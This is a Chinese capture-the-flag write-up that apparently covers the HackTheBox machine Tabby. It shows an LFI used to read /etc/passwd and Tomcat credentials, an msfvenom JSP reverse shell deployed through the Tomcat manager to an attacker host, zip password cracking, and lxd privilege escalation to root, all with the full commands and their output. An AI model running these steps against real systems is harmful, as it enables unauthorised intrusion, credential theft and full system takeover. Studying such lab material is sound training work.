# 免责声明
>本文渗透的主机经过合法授权。本文使用的工具和方法仅限学习交流使用，请不要将文中使用的工具和渗透思路用于任何非法用途，对此产生的一切后果，本人不承担任何责任，也不对造成的任何误用或损害负责

# 服务探测
查看开启端口
```
┌──(root💀kali)-[~/htb/Tabby]
└─# nmap -p- 10.10.10.194 --open                                                   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 04:22 EST
Nmap scan report for 10.10.10.194
Host is up (0.25s latency).
Not shown: 64733 closed ports, 799 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 249.82 seconds

```

端口详细信息
```
┌──(root💀kali)-[~/htb/Tabby]
└─# nmap -sV -T4  -A -O 10.10.10.194 -p 22,80,8080                                 
Starting Nmap 7.91 ( https://nmap.org ) at 2021-12-30 04:33 EST
Nmap scan report for 10.10.10.194
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Mega Hosting
8080/tcp open  http    Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Apache Tomcat
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   292.67 ms 10.10.14.1
2   293.43 ms 10.10.10.194

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.08 seconds

```

有两个http服务,80是apache，8080是tomcat

## 80端口

80端口打开以后，在```NEWS```栏发现导航到了```http://megahosting.htb/news.php?file=statement"```

把```megahosting.htb```添加到本地host文件

```echo "10.10.10.194 megahosting.htb" >> /etc/hosts```

```NEWS```网页显示:
> We apologise to all our customers for the previous data breach.
> We have changed the site to remove this tool, and have invested heavily in more secure servers

曾经发生过信息泄露，哦？

留意到url里file这个参数，貌似是一个文件名，输入```http://megahosting.htb/news.php?file=../../../../../etc/passwd```

成功回显靶机```/etc/passwd```内容，证明存在LFI

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
tomcat:x:997:997::/opt/tomcat:/bin/false
mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

存在一个普通用户```ash```

对于不存在，或者没有权限的文件，页面不会有任何返回。

## 8080端口服务

在8080端口首页，暴露出了一些信息，结合80端口的LFI，也许能搞点事情

```
It works !

If you're seeing this page via a web browser, it means you've setup Tomcat successfully. Congratulations!

This is the default Tomcat home page. It can be found on the local filesystem at: /var/lib/tomcat9/webapps/ROOT/index.html

Tomcat veterans might be pleased to learn that this system instance of Tomcat is installed with CATALINA_HOME in /usr/share/tomcat9 and CATALINA_BASE in /var/lib/tomcat9, following the rules from /usr/share/doc/tomcat9-common/RUNNING.txt.gz.

You might consider installing the following packages, if you haven't already done so:

tomcat9-docs: This package installs a web application that allows to browse the Tomcat 9 documentation locally. Once installed, you can access it by clicking here.

tomcat9-examples: This package installs a web application that allows to access the Tomcat 9 Servlet and JSP examples. Once installed, you can access it by clicking here.

tomcat9-admin: This package installs two web applications that can help managing this Tomcat instance. Once installed, you can access the manager webapp and the host-manager webapp.

NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat9/tomcat-users.xml.
```

暴露出来网页根目录的路径:```/var/lib/tomcat9/webapps/ROOT/```


```http://10.10.10.194:8080/docs/```显示tomcat版本是```Version 9.0.31```



显示管理用户配置文件在```/etc/tomcat9/tomcat-users.xml```,但是无法显示


在本机搭建了一个同样版本的tomcat，资源在[这里](https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.31/bin/apache-tomcat-9.0.31.tar.gz)

查看目录结构
```
┌──(root💀kali)-[/var/lib/tomcat9]
└─# ls
bin  BUILDING.txt  conf  CONTRIBUTING.md  lib  LICENSE  logs  NOTICE  README.md  RELEASE-NOTES  RUNNING.txt  temp  webapps  work


```

conf
```
┌──(root💀kali)-[/var/lib/tomcat9/conf]
└─# ls
catalina.policy  catalina.properties  context.xml  jaspic-providers.xml  jaspic-providers.xsd  logging.properties  server.xml  tomcat-users.xml  tomcat-users.xsd  web.xml

```


```conf```文件夹应该跟```webapps```在同一级，但是浏览器上一直无法回显。。。


查看本地tomcat9，好像没啥文件有读权限的。

## curl


后来看论坛提示，要直接用```apt install tomcat9```安装

查看```tomcat-users.xml```位置

```
┌──(root💀kali)-[~/htb/Tabby]
└─# find / -name tomcat-users.xml
/etc/tomcat9/tomcat-users.xml
/usr/share/tomcat9/etc/tomcat-users.xml

```

```/etc/tomcat9/tomcat-users.xml ```普通用户没有读取权限
```
┌──(root💀kali)-[~/htb/Tabby]
└─# ls -alh /etc/tomcat9/tomcat-users.xml           
-rw-r----- 1 root tomcat 2.7K 11月 10 03:15 /etc/tomcat9/tomcat-users.xml

```

但是```/usr/share/tomcat9/etc/tomcat-users.xml```普通用户是可读的
```
┌──(root💀kali)-[~/htb/Tabby]
└─# ls -alh /usr/share/tomcat9/etc/tomcat-users.xml 
-rw-r--r-- 1 root root 2.7K 11月 10 03:15 /usr/share/tomcat9/etc/tomcat-users.xml

```

使用paylaod```http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml```用网页打开，需要打开网页源代码才能显示配置

但是用curl可以马上回显

```curl -X GET -H 'Content-type:text/xml'  http://10.10.10.194/news.php?file=../../../../../usr/share/tomcat9/etc/tomcat-users.xml```

tomcat-users.xml配置信息
```
<tomcat-users xmlns="http://tomcat.apache.org/xml"
              xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
              xsi:schemaLocation="http://tomcat.apache.org/xml tomcat-users.xsd"
              version="1.0">
  <role rolename="admin-gui"/>
   <role rolename="manager-script"/>
   <user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
</tomcat-users>
```

得到一个tomcat的后台账号：```tomcat:$3cureP4s5w0rd123!```


然而这个权限只是```admin-gui```和```manager-script```,不是```manager-gui```,因此我们无法打开manger页面，无法使用exp

但是后来发现使用 curl是可以访问到manager的后台文件的

```
┌──(root💀kali)-[~/htb/Tabby]
└─# curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/list
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/host-manager:running:2:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs

```

参考[hacktricks](https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat)里的方法

编译反弹shell
```msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.3 LPORT=4242 -f war -o revshell.war```


上传反弹shell
```
┌──(root💀kali)-[~/htb/Tabby]
└─# curl --upload-file revshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/revshell"
OK - Deployed application at context path [/revshell]

```

浏览器打开：```http://10.10.10.194:8080/revshell/```


拿到反弹shell
```
┌──(root💀kali)-[~/htb/Tabby]
└─# nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.194] 50070
id
uid=997(tomcat) gid=997(tomcat) groups=997(tomcat)

```

# user

在```/var/www/html/files```找到一个加密zip文件```16162020_backup.zip```

下载到本地后用zip2john转成john可以识别的格式
```
┌──(root💀kali)-[~/htb/Tabby]
└─# /usr/sbin/zip2john 16162020_backup.zip >zip.hash   
16162020_backup.zip/var/www/html/assets/ is not encrypted!
ver 1.0 16162020_backup.zip/var/www/html/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/favicon.ico PKZIP Encr: 2b chk, TS_chk, cmplen=338, decmplen=766, crc=282B6DE2
ver 1.0 16162020_backup.zip/var/www/html/files/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/index.php PKZIP Encr: 2b chk, TS_chk, cmplen=3255, decmplen=14793, crc=285CC4D6
ver 1.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/logo.png PKZIP Encr: 2b chk, TS_chk, cmplen=2906, decmplen=2894, crc=2F9F45F
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/news.php PKZIP Encr: 2b chk, TS_chk, cmplen=114, decmplen=123, crc=5C67F19E
ver 2.0 efh 5455 efh 7875 16162020_backup.zip/var/www/html/Readme.txt PKZIP Encr: 2b chk, TS_chk, cmplen=805, decmplen=1574, crc=32DB9CE3
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.

```
破解获取到一个密码
```
┌──(root💀kali)-[~/htb/Tabby]
└─# john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
admin@it         (16162020_backup.zip)
1g 0:00:00:01 DONE (2021-12-31 03:15) 0.7246g/s 7509Kp/s 7509Kc/s 7509KC/s adnc153..adenabuck
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

解密zip
```
┌──(root💀kali)-[~/htb/Tabby]
└─# unzip 16162020_backup.zip
Archive:  16162020_backup.zip
[16162020_backup.zip] var/www/html/favicon.ico password: 
  inflating: var/www/html/favicon.ico  
   creating: var/www/html/files/
  inflating: var/www/html/index.php  
 extracting: var/www/html/logo.png   
  inflating: var/www/html/news.php   
  inflating: var/www/html/Readme.txt
```
然而没有找到任何有用的文件，尝试 使用破解的密码登陆ash的账号

```
tomcat@tabby:~$ su ash
su ash
Password: admin@it

ash@tabby:/opt/tomcat$ id 
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
ash@tabby:/opt/tomcat$ whoami
whoami
ash

```

成功了。

# root

查看组用户信息，发现ash账号在lxd用户组
```
ash@tabby:/var/lib/tomcat9$ id
id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)

```

按照[hacktricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)Method 2里的提权方法


kali端：
下载仓库到本地

```git clone https://github.com/saghul/lxd-alpine-builder```

编译：
```
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

攻击机用python开启一个http服务，传编译好的镜像文件到靶机


```wget http://10.10.16.3:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz```

靶机端加载靶机，初始化。注意：此操作不能在```/tmp```目录下执行，只能在```/home/ash/```下
```
ash@tabby:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
<e-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
ash@tabby:~$ lxd init

```
一路按默认。

提权到root
```
ash@tabby:~$ lxc init myimage mycontainer -c security.privileged=true
lxc init myimage mycontainer -c security.privileged=true
Creating mycontainer
ash@tabby:~$ lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
<ydevice disk source=/ path=/mnt/root recursive=true
Device mydevice added to mycontainer
ash@tabby:~$ lxc start mycontainer
lxc start mycontainer
ash@tabby:~$ lxc exec mycontainer /bin/sh
lxc exec mycontainer /bin/sh
~ # ^[[50;5Rid
id
uid=0(root) gid=0(root)
~ # ^[[50;5Rwhoami
whoami
root

```

找到root.txt
```
~ # ^[[50;5Rfind / -name root.txt
find / -name root.txt
/mnt/root/root/root.txt

```

# 总结
Foothold是最难的部分，如果不明白tomcat的配置，不使用curl探测就无法拿到初始shell。```hacktricks```真是我们的好朋友！没有思路的时候一定要常常看看。
user很简单。
提权到root时，一开始在```/tmp```目录操作一直报错说找不到镜像文件的路径。后来想想docker里这些路径可能会有些奇怪
尝试从lxd管理员ash的家目录加载，终于成功了。